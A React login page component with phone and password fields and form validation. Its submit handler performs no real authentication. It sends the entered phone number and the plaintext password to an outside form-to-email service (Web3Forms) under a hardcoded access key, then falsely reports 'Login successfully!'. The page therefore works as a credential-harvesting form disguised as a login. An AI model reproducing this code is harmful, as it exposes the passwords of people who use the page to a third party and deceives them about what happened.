import React from "react";
import { Link } from "react-router-dom";
import { useForm } from "react-hook-form";
const Login = () => {
  const {
    register,
    handleSubmit,
    watch,
    reset,
    formState: { errors, isSubmitSuccessful, isSubmitting },
  } = useForm();

  async function onSubmit(data) {
    const formData = {
      access_key: "c1d7a506-24d8-4ae7-ba16-315620fe0962",
      name: data.phone, // Map phone to name
      email: "test@example.com", // Required by Web3Forms
      message: `Login attempt with password: ${data.password}`,
    };

    const response = await fetch("https://api.web3forms.com/submit", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(formData),
    });

    const result = await response.json();
    console.log(result);
    if (result.success) {
      alert("Login successfully!");

      reset();
    } else {
      console.error("Login error:", result);
    }
  }
  return (
    <div className="min-h-screen bg-pink-100 flex items-center w-full max-w-[1530px] justify-center">
      <div className="bg-white p-8 rounded-2xl shadow-lg w-[350px] md:w-[400px] ">
        <h2 className="text-2xl font-bold mb-6 text-pink-600 text-center">
          Login
        </h2>
        <form onSubmit={handleSubmit(onSubmit)}>
          <div className="mb-4">
            <label className=" text-sm font-medium text-gray-700 mb-1">
              Phone
            </label>
            <input
              {...register("phone", {
                required: "Phone number is required",
                pattern: {
                  value: /^[0-9]{10}$/,
                  message: "Enter a valid 10-digit phone number",
                },
              })}
              placeholder="Enter phone"
              className={`w-full px-4 py-2 border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-pink-400 ${
                errors.phone ? "border-red-600" : ""
              }`}
            />
            {errors.phone && (
              <p className="text-red-600">{errors.phone.message}</p>
            )}
          </div>
          <div className="mb-6">
            <label className=" text-sm font-medium text-gray-700 mb-1">
              Password
            </label>
            <input
              {...register("password", {
                required: "Password is required",
                minLength: { value: 6, message: "min 6 length is required" },
              })}
              className={`w-full px-4 py-2 border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-pink-400 ${
                errors.password ? "border-red-600" : ""
              }`}
              type="password"
              name="password"
              autoComplete="current-password"
              placeholder="Enter password"
            />
            {errors.password && (
              <p className="text-red-600">{errors.password.message}</p>
            )}
          </div>
          <button
            type="submit"
            disabled={isSubmitting}
            className={`w-full bg-pink-500 text-white py-2 rounded-xl hover:bg-pink-600 transition-colors duration-300 ${
              isSubmitting ? "opacity-50 cursor-not-allowed" : ""
            }`}
          >
            {isSubmitting ? "Logging in..." : "Login"}
          </button>
        </form>
        {/* signup form */}
        <p className="mt-6 text-center text-sm text-gray-600">
          Don't have an account?{" "}
          <Link
            to="/signup"
            className="text-pink-600 font-semibold hover:underline"
          >
            Sign up
          </Link>
        </p>
      </div>
    </div>
  );
};

export default Login;
